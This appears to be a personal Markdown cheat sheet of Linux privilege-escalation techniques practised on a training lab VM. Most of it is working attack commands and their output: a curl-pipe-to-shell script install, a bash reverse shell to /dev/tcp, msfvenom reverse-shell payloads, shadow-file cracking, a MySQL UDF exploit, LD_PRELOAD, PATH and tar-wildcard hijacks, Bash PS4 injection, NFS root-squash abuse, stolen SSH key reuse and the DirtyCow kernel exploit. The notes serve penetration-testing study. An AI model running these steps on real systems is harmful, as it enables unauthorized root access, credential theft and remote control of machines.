# privesc

- INTRO

- horizontal privesc

- vertical privesc

https://book.hacktricks.xyz/linux-unix/privilege-escalation  (carlosmpolopm)

## Linpeas

### From github

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Output to file

```bash
./linpeas.sh -a /tmp/linpeas.txt #Victim

less -r /linpeas.txt #Read with colors
```

## linenum

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

## two ways of uploading:

1- python server then wget

```
python3 -m http.server 8000

wget <ip>:<port>/<file>

chmod +x <file.sh>
```

2- copy and paste linenum using Vi or nano , save and add permission

# INDEX

1- [Basic](#1)

2- [Path Variables](#2)

3- [Raptor / mysql](#3)

4- [weak file permissions](#4)

5- [SUDO ](#5)

6- [Abusing shell features](#6)

7- [Pass & Keys](#7)

8- [Mounting Shares](#8)

9- [Kernell](#9)

[go back to top](#index)

## 1

### Basic manual enumeration

hostname:

`id`

users:

`cat /etc/passwd;  ls -lah /etc/passwd`

shells:

`cat /etc/shells; ls -lah /etc/shells`

crontabs:

`cat /etc/crontab; ls -lah /etc/crontab`

shadow

`cat /etc/shadow; ls -lah /etc/shadow`

What can user run as root?

`sudo -l`

Finding and Exploiting SUID Files

`find / -perm -u=s -type f 2>/dev/null`


`find / -type f -u plotted_root 2>/dev/null`

---

### Exploiting a writable /etc/passwd

```js
	test:x:0:0:root:/root:/bin/bash
```

as divided by colon 

**Username**: It is used when user logs in. It should be between 1 and 32 characters in length.

**Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.

**Group ID (GID)**: The primary group ID (stored in /etc/group file)

**User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.

**Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /

**Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.


```
openssl passwd -1 -salt [salt] [password]
```

### Escaping Vi

sudo -l 

```
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:/home/user3$ sudo vi
```
then type to open shell as root:
```
:!sh
```
	


### Cronjob

```
cat /etc/cronjob
```

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

\# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

\#  m   h dom mon dow user  command
```
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```


replace content of file with reverse shell:
```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

### cron jobs file permission


cat /etc/crontab

`locate <file>`

`ls -l <file>`


make file, 

```
#!/bin/bash
bash -i >& /dev/tcp/10.6.65.43/4444 0>&1
```

start listner,

`nc -lvnp 4444`

# #2

### $PATH variable

[go back to top](#index)

echo $PATH

create file in tmp


echo "[whatever command we want to run]" > [name of the executable we're imitating] 

```
echo "/bin/bash" > ls
```


make it executable

```
chmod +X ls
```

or 

```
chmod 777 ls
```


change the path variable

```
export PATH=/tmp/:$PATH
```


go back to directory of binary and run again

# 3

### raptor practice

[go back to top](#index)

```
id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

service exploit mysql

https://www.exploit-db.com/exploits/1518

```
cd /home/user/tools/mysql-udf
```
compile raptor code:
```
gcc -g -c raptor_udf2.c -fPIC

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

connect to mysql:
```
mysql -u root
```

use mysql;
```
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';


select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
exit

```
/tmp/rootbash -p
```







# 4

### weak file permission

[go back to top](#index)

readable /etc/shadow file
```
ls -l /etc/shadow

cat /etc/shadow

sudo echo <hash> > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


su root
```


writable /etc/shadow file

```
ls -l /etc/shadow

mkpasswd -m sha-512 newpasswordhere

su root 
```



writable /etc/password

```
ls -l /etc/passwd

openssl passwd <password>
```
put password in x of root
```
su root
```
or

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").




# 5

### SUDO

[go back to top](#index)

sudo shell escape sequence
```
sudo -l   
```
then look for instructions on website

https://gtfobins.github.io/






sudo Environment variables

```sudo -l ```

Create a shared object using the code located at 
```
/home/user/tools/sudo/preload.c:

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

Run ldd against the apache2 program file to see which shared libraries are used by the program:
```
ldd /usr/sbin/apache2
```
Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
```
sudo LD_LIBRARY_PATH=/tmp apache2
```







path environment variable

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```





wildcard


View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
https://gtfobins.github.io/gtfobins/tar/
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
```
chmod +x /home/user/shell.elf
```

Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
nc -nvlp 4444

### SUID / SGID

Executables known exploits
```
find / -perm -u=s -type f 2>/dev/null

find / -user cage -type f 2>/dev/null
```
Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
exim-4.84-3 

/home/user/tools/suid/exim/cve-2016-1531.sh





Shared Object Injection

```
/usr/local/bin/suid-so

strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
/usr/local/bin/suid-so


```
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$ mkdir /home/user/.config
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
[=====================================================================>] 99 %
Done.
user@debian:~$ ^C
user@debian:~$ 
```



Environmental variables
```
/usr/local/bin/suid-env

strings /usr/local/bin/suid-env
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

```
gcc -o service /home/user/tools/suid/service.c

PATH=.:$PATH /usr/local/bin/suid-env
```
(disregard location, was looking at tools)
```
user@debian:~/tools/privesc-scripts$ /usr/local/bin/suid-env
[....] Starting web server: apache2httpd (pid 1772) already running
. ok 
user@debian:~/tools/privesc-scripts$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
user@debian:~/tools/privesc-scripts$ gcc -o service /home/user/tools/suid/service.c
user@debian:~/tools/privesc-scripts$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~/tools/privesc-scripts# 
```

# 6

### Abusing shell features #1

[go back top](#index)

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

```
strings /usr/local/bin/suid-env2
```
In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

````/bin/bash --version````


```
user@debian:~/tools/privesc-scripts$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
user@debian:~/tools/privesc-scripts$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~/tools/privesc-scripts$ export -f /usr/sbin/service
user@debian:~/tools/privesc-scripts$ /usr/local/bin/suid-env2
root@debian:~/tools/privesc-scripts# 
```





abusing shell features #2


Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p



```
user@debian:~/tools/privesc-scripts$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1772) already running
.
user@debian:~/tools/privesc-scripts$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

# 7

### Passwords & Keys

[go back top](#index)

History file

```
cat ~/.*history | less

su root
```


Config Files

```ls /home/user```
```cat <myvpn file>```



```
user@debian:~$ ls /home/user
myvpn.ovpn  tools
user@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

user@debian:~$ cat /etc/openvpn/auth.txt
root
password123
user@debian:~$ 
```




SSH keys


```ls -la /```

Note that there appears to be a hidden directory called .ssh. View the contents of the directory:

```ls -l /.ssh```

Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

```chmod 600 root_key```

Use the key to login to the Debian VM as the root account (change the IP accordingly):

```ssh -i root_key root@10.10.10.10```





# 8

## NSF  (mounting shares)

[go back top](#index)

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```cat /etc/exports```

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

```sudo su```

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```
Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
Still using Kali's root user, make the file executable and set the SUID permission:
```
chmod +xs /tmp/nfs/shell.elf
```
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

```/tmp/shell.elf```




# 9

## Kernell 

[go back to top](#index)


dirty cow     Linux Kernel <= 3.19.0-73.8

whoami   == verify user

uname -a   == verify vulnerability

download the cow,
https://www.exploit-db.com/exploits/40839/

other versions,
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

```js
user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024

user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0wuser@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap f05df000

madvise 0

ptrace 0


user@debian:~$ /usr/bin/passwd
root@debian:/home/user# 
```



search for other versions 
searchsploit Linux Kernell <version>








ps -aux | grep root


 [go back to top](#index)
 
 

